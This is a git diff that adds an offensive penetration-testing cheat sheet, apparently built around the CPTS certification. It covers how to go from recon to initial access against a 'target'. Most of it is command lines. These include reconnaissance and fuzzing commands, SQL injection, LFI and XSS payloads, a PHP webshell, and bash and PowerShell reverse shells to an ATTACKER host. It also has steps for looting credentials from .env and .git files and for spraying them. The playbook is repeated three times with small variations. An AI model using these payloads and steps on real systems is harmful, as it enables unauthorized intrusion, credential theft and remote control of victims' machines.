@@ -1,0 +1,612 @@
+🔥 Initial Recon → Initial Access WAR PLAN
+Objective: Get initial access fast, methodically, and without missing weak spots.
+
+🧠 Top-Level Mindset:
+❌ Don’t guess
+✅ Enumerate, pivot logic
+🔁 Branch workflows
+🕳️ Find holes or force one open
+
+“If this fails, I do that.”
+“If this hits, I push deep.”
+NO stalls. NO second-guessing.
+
+⚔️ PHASE 1: EXTERNAL RECON – THE OPENING STRIKE
+🎯 Objectives:
+Discover all attack surface
+
+Identify weak spots before fuzzing them blindly
+
+Reduce wasted spray attempts
+
+Think like a recon drone, not a battering ram
+
+1️⃣ Subdomain Enumeration (Always Step 1)
+bash
+Copy
+Edit
+# Passive (fast, quiet)
+amass enum -passive -d target.com
+subfinder -d target.com -silent
+
+# Active (catch hidden/internal staging/dev)
+assetfinder --subs-only target.com
+dnsx -l subdomains.txt -a -resp
+
+# Resolve + filter
+httpx -l subdomains.txt -o live.txt -mc 200,302,403
+💡 Branch:
+→ Got 5–10 live subs? Move to fingerprinting.
+→ Got staging/dev/internal-looking subdomains? Flag them — they’re usually weak.
+
+2️⃣ Port Scanning & Service Recon (parallel tasks)
+bash
+Copy
+Edit
+nmap -p- -T4 -Pn target.com --min-rate=1000 -oA full
+nmap -sC -sV -p<interesting_ports> target.com -oA services
+Check for:
+
+80/443 (web)
+
+21/22/3306 (FTP/SSH/DB access)
+
+8080/8000 (alt web)
+
+445/139/3389 (SMB/RDP)
+
+Anything non-standard (try web if you don’t recognize it)
+
+3️⃣ Web Stack Detection
+bash
+Copy
+Edit
+# Quick headers
+curl -I https://target.com
+whatweb https://target.com
+nuclei -u https://target.com -t technologies/
+
+# Visual for fast triage
+gowitness file -f live.txt -P screenshots/
+Branch:
+
+WordPress → use WPScan
+
+Custom stack → prepare for ffuf + tech-specific payloads
+
+🔍 PHASE 2: FFUF → WEB VULN CHAINING
+🎯 Objective:
+Find hidden panels, APIs, and entrypoints. Then exploit them or escalate up stack.
+
+1️⃣ Directory Bruteforce (Initial Touch)
+bash
+Copy
+Edit
+ffuf -u https://target/FUZZ -w $WORDLIST -mc all -fs 0 -t 40 -o ffuf_basic.json
+Use:
+
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+
+2️⃣ Hidden File & Extension Fuzz
+bash
+Copy
+Edit
+ffuf -u https://target/FUZZ.php -w common.txt -e .php,.txt,.bak,.zip,.old,.tar.gz -mc all -fs 0
+Branch:
+
+Found /backup.zip, .git, .env, etc? ➤ Loot creds
+
+Found /admin, /api, or /dev? ➤ Switch into logic-based enumeration
+
+3️⃣ Param Fuzzing (if site has ?id= or query structure)
+bash
+Copy
+Edit
+ffuf -u "https://target/page.php?FUZZ=1" -w wordlists/parameters.txt -fs 0 -mc all
+🚩 At This Point You Branch:
+🟥 A. IF FFUF YIELDS NOTHING
+→ Go wider:
+
+Switch wordlists (try raft, dns, content-specific)
+
+Change extensions
+
+Try wfuzz, gobuster for behavioral difference
+
+→ Pivot recon:
+
+nuclei on whole domain
+
+Run gau, waybackurls, katana for legacy routes:
+
+bash
+Copy
+Edit
+gau target.com | httpx -silent | tee old_urls.txt
+→ Check SSL certs:
+
+bash
+Copy
+Edit
+openssl s_client -connect target.com:443 | openssl x509 -noout -text | grep DNS
+→ Grep subdomains from JS files:
+
+bash
+Copy
+Edit
+hakrawler -url https://target.com -js -depth 3 | tee crawl.txt
+🟩 B. IF FFUF FINDS HIDDEN ROUTE / PANEL
+→ Analyze:
+
+Does it require auth? Try default creds / brute
+
+Is it a file upload? Test bypasses
+
+Is it parameter-based? Try:
+
+SQLi: ', or 1=1, '--, 1' or sleep(5)--
+
+XSS: <script>alert(1)</script>
+
+LFI: ?page=../../../../etc/passwd
+
+→ Find version numbers? Lookup CVEs → See dev routes? Try old paths (/dev/login, /old_admin)
+
+⚔️ PHASE 3: FROM EXPLOIT → SHELL (Initial Access)
+A. Command Injection / RCE / File Uploads
+bash
+Copy
+Edit
+# Linux
+bash -i >& /dev/tcp/ATTACKER/4444 0>&1
+
+# Windows (PowerShell)
+powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();..."
+
+# File upload webshell
+<?php system($_GET['cmd']); ?>
+# Access: target/shell.php?cmd=whoami
+B. Looted Creds / Configs
+→ Use found creds to login to:
+
+Web panels
+
+SSH
+
+FTP
+
+MySQL (mysql -u user -p)
+
+WinRM (evil-winrm -i IP -u user -p pass)
+
+C. Git / .env / Backup Abuse
+bash
+Copy
+Edit
+# .env
+grep -i 'pass\|user\|key' .env
+
+# Git
+git log --oneline
+git grep -i pass
+🧠 MASTER BRANCHING LOGIC (To Shave Time)
+text
+Copy
+Edit
+Recon → Subdomain/Port/Web ID
+     ↳ If web present → FFUF
+          ↳ If nothing → Switch tools/lists → Fallback recon
+          ↳ If found → Analyze logic
+              ↳ If cred leak → Try login
+              ↳ If param-based → Try LFI, SQLi, RCE
+              ↳ If file upload → Webshell + rev shell
+                  ↳ If shell → Priv esc phase begins
+📌 Final Note – Initial Access Mindset
+You don’t "wait" for the vuln to show itself.
+You pressure the stack until it leaks something usable:
+
+A panel
+
+A config
+
+A logic flaw
+
+A misbehavior
+
+You're not just enumerating...
+You're weaponizing curiosity.
+
+🎯 PHASE 1: INTEL GATHERING & TARGET PROFILING
+🧠 “What exists?”
+
+🔹 1. Subdomain & DNS Enumeration
+Primary Tools:
+bash
+Copy
+Edit
+subfinder -d target.com -silent -o subs.txt
+amass enum -passive -d target.com -o amass.txt
+assetfinder --subs-only target.com >> subs.txt
+Secondary Sweep:
+bash
+Copy
+Edit
+dnsx -l subs.txt -resp -a -o resolved.txt
+httpx -l resolved.txt -mc 200,302,403,500 -title -tech-detect -o livehosts.txt
+🧠 THEN:
+
+Check for patterns: dev.target.com, stage, portal, api, test
+
+Highlight any weird ports: :8080, :8443, :8000
+
+🔹 2. Port & Service Enumeration
+Full TCP:
+bash
+Copy
+Edit
+nmap -p- -T4 -Pn <IP> --min-rate=1000 -oA full
+Targeted Scan:
+bash
+Copy
+Edit
+nmap -sC -sV -p<open ports> <IP> -oA service
+🧠 THEN:
+
+Group targets:
+
+Web Servers → FFUF/Nuclei
+
+SMB/FTP/SSH → Credential spray / misconfig hunt
+
+Databases → Default creds, version vulns
+
+🔹 3. Web Tech Detection + Crawl
+Tech Stack ID:
+bash
+Copy
+Edit
+whatweb <URL>
+nuclei -u <URL> -t technologies/
+Crawl & Collect:
+bash
+Copy
+Edit
+hakrawler -url https://target.com -depth 3 -js -o crawl.txt
+gau target.com | tee urls.txt
+waybackurls target.com >> urls.txt
+🧠 THEN:
+
+Mark live but hidden routes (/dev, /old, /v1, /staging)
+
+Save all *.js and parse for subdomains, API routes, keys
+
+🚪 PHASE 2: TARGET ENUMERATION & SURFACE VALIDATION
+🧠 “What can I touch?”
+
+🔹 4. Directory & File Bruteforce
+bash
+Copy
+Edit
+ffuf -u https://target/FUZZ -w raft-medium-directories.txt -fs 0 -mc all -t 50 -o dir.txt
+ffuf -u https://target/FUZZ.php -w common.txt -e .php,.bak,.zip,.old -fs 0 -mc all -o ext.txt
+If 0 results? Swap to:
+
+bash
+Copy
+Edit
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 https://target/FUZZ
+🔹 5. Virtual Host Discovery (Hidden subs)
+bash
+Copy
+Edit
+ffuf -u https://target/ -H "Host: FUZZ.target.com" -w subdomains.txt -fs 0 -o vhost.txt
+🔹 6. Parameter Discovery
+bash
+Copy
+Edit
+ffuf -u "https://target/page.php?FUZZ=1" -w parameters.txt -fs 0 -mc all
+🔹 7. CMS Fingerprinting & Exploit Mapping
+bash
+Copy
+Edit
+# WordPress:
+wpscan --url https://target.com -e vp,vt,u --api-token <token>
+
+# Joomla/Drupal/etc:
+nuclei -u https://target.com -t cves/
+🧠 THEN:
+
+Searchsploit results mapped to versions
+
+Create path-to-shell tree per CMS
+
+🕳️ PHASE 3: DEEP DIVE BRANCHING – Based on Enum Hits
+🧠 “Now that I’ve mapped the terrain, where’s the weakness?”
+
+🟩 Found admin, login, or known app routes?
+→ Try:
+
+Default creds (admin:admin, admin:password)
+
+Burp Intruder brute with rockyou.txt small
+
+Check for bypass: OR 1=1, #, '--, admin' --
+
+🟧 Found .git, .env, .zip, .bak, or backup files?
+→ Download & loot:
+
+bash
+Copy
+Edit
+# .env
+grep -i 'pass\|user\|key' .env
+
+# .git
+git log
+git show
+git grep -i pass
+🟥 Found Upload or RCE Route?
+→ Try Webshell / Revshell:
+
+php
+Copy
+Edit
+<?php system($_GET['cmd']); ?>
+→ Revshell:
+
+bash
+Copy
+Edit
+bash -i >& /dev/tcp/ATTACKER/4444 0>&1
+→ Payload hosting:
+
+bash
+Copy
+Edit
+python3 -m http.server 80
+🟨 Found DB Creds / Config Files?
+→ Try:
+
+bash
+Copy
+Edit
+mysql -u root -p
+psql -h <target> -U user -W
+→ Try creds on:
+
+SSH
+
+FTP
+
+CMS admin
+
+RDP/WinRM
+
+🟥 Param-Based Page Found?
+→ Test LFI:
+
+bash
+Copy
+Edit
+?page=../../../../etc/passwd
+?page=....//....//....//....//windows/win.ini
+→ Test SQLi:
+
+bash
+Copy
+Edit
+?id=1'
+?id=1 or sleep(5)--
+?id=' or 1=1-- -
+→ Test Command Injection:
+
+bash
+Copy
+Edit
+; whoami
+| id
+🧠 YOUR FINAL CHECKLIST BEFORE "I GOT NOTHING"
+✅ Subdomains (passive + brute + JS)
+✅ Ports/services (full + targeted scan)
+✅ FFUF (standard, extensions, params)
+✅ Crawl (JS + legacy + wayback)
+✅ Hidden VHosts
+✅ Nuclei CVEs
+✅ Auth/Upload/File handling
+✅ Config/git/backup leakage
+✅ Logic flaws (password reset, enum, etc)
+✅ DNS / SSL Cert analysis
+✅ Brute / spray creds (if anything leaks)
+
+If you've done ALL this and still stuck? You missed something small or the vuln is hidden in logic — start replaying all parameters, upload files with different extensions, or intercept JS/API calls.
+
+⚠️ IF YOU GET IN — Your next move is NOT celebration
+It’s:
+
+🕵️ whoami
+🕸️ Internal recon
+🧠 Triage what you landed on
+💣 Priv esc planning begins
+
+🧠 Initial Access Decision Tree – CPTS Style
+🌐 PHASE 1: External Recon – Mapping the Battlefield
+✅ Step 1: Subdomain Enumeration
+bash
+Copy
+Edit
+subfinder -d target.com -silent -o subs.txt
+amass enum -passive -d target.com -o amass.txt
+assetfinder --subs-only target.com >> subs.txt
+➡️ THEN:
+
+bash
+Copy
+Edit
+dnsx -l subs.txt -resp -a -o resolved.txt
+httpx -l resolved.txt -mc 200,302,403,500 -title -tech-detect -o livehosts.txt
+🧠 IF:
+
+✅ Got results → move to web tech & port scan
+
+❌ Got nothing → scrape JS, SSL, gau, Wayback
+
+🔍 Step 2: Port + Service Scan
+bash
+Copy
+Edit
+nmap -p- -T4 -Pn <IP> --min-rate=1000 -oA full
+nmap -sC -sV -p<top_ports> <IP> -oA services
+➡️ Branch based on open ports:
+
+Port	Service	Next Step
+80/443/8080	Web	FFUF + Nuclei + Crawl
+21	FTP	Try anonymous login
+22	SSH	Try found creds / spray
+445/139	SMB	Enum shares, users, GPP, LAPS
+3389	RDP	Evil RDP if creds
+🌐 Step 3: Web Technology & Vulnerability Detection
+bash
+Copy
+Edit
+whatweb https://target
+nuclei -u https://target -t technologies/
+✅ Got CMS?
+
+bash
+Copy
+Edit
+# WordPress?
+wpscan --url https://target.com -e vp,vt,u --api-token <token>
+🕵️ Step 4: JS Crawl, Legacy Paths, Hidden Routes
+bash
+Copy
+Edit
+hakrawler -url https://target.com -js -depth 3 -o js_links.txt
+gau target.com >> urls.txt
+waybackurls target.com >> urls.txt
+➡️ THEN:
+
+Search .env, .git, admin, login, backup, zip, etc.
+
+Resolve all unique URLs with httpx
+
+🧪 PHASE 2: Fuzzing and File Discovery
+✅ Step 5: Directory & Extension Brute
+bash
+Copy
+Edit
+ffuf -u https://target/FUZZ -w raft-medium.txt -fs 0 -mc all -t 50
+ffuf -u https://target/FUZZ -w common.txt -e .php,.bak,.zip,.txt,.old -fs 0 -mc all
+🧠 IF:
+
+✅ Results? ➡️ Analyze functionality (auth, upload, admin)
+
+❌ Nothing? ➡️ Try wfuzz, DNS bruteforce, VHost scan
+
+✅ Step 6: Parameter Discovery
+bash
+Copy
+Edit
+ffuf -u "https://target/page.php?FUZZ=1" -w parameters.txt -fs 0 -mc all
+🧠 IF:
+
+Params work → Test for LFI, RCE, SQLi, logic bypasses
+
+✅ Step 7: Virtual Host Bruteforce (Hidden Apps)
+bash
+Copy
+Edit
+ffuf -u https://target/ -H "Host: FUZZ.target.com" -w subdomains.txt -fs 0
+🪓 PHASE 3: Web App Attack Paths
+✅ Step 8: Analyze Discovered Functionality
+Found	Try
+/admin	Default creds, logic bypass
+/login	Brute/spray (Burp), SQLi bypass
+File upload	Bypass validation, drop webshell
+.git, .env, .zip	Loot creds, keys, secrets
+💥 Step 9: Exploitation Attempts
+LFI Test:
+bash
+Copy
+Edit
+?page=../../../../etc/passwd
+SQLi Test:
+bash
+Copy
+Edit
+?id=1' --  
+?id=1 or sleep(5)--
+Command Injection:
+bash
+Copy
+Edit
+; whoami
+| id
+Reverse Shell:
+bash
+Copy
+Edit
+bash -i >& /dev/tcp/ATTACKER/4444 0>&1
+🛡️ PHASE 4: Config Abuse & Cred Replay
+✅ Step 10: Looted Configs or Creds?
+→ Use creds on:
+
+SSH
+
+FTP
+
+Admin panels
+
+RDP
+
+WinRM
+
+DB connections
+
+Test:
+bash
+Copy
+Edit
+ssh user@target
+evil-winrm -i target -u user -p pass
+🚨 LAST RESORT ENUM PATHS (IF NOTHING HITS)
+✅ Use:
+
+bash
+Copy
+Edit
+nuclei -l livehosts.txt -t cves/
+✅ Re-crawl JS & deeper fuzz with:
+
+bash
+Copy
+Edit
+ffuf -u https://target/FUZZ -w raft-large-files.txt
+✅ DNS Bruteforce:
+
+bash
+Copy
+Edit
+dnsrecon -d target.com -D subdomains.txt -t brt
+✅ Email, metadata, leaked S3 buckets:
+
+bash
+Copy
+Edit
+curl -s https://crt.sh/?q=target.com | grep target.com
+✅ SUCCESS: Got Initial Access?
+whoami
+
+ipconfig / ifconfig
+
+Drop linpeas.sh or winPEAS.bat
+
+Start privilege escalation phase
+
+
+
+Begin loot + pivot logic
+
+
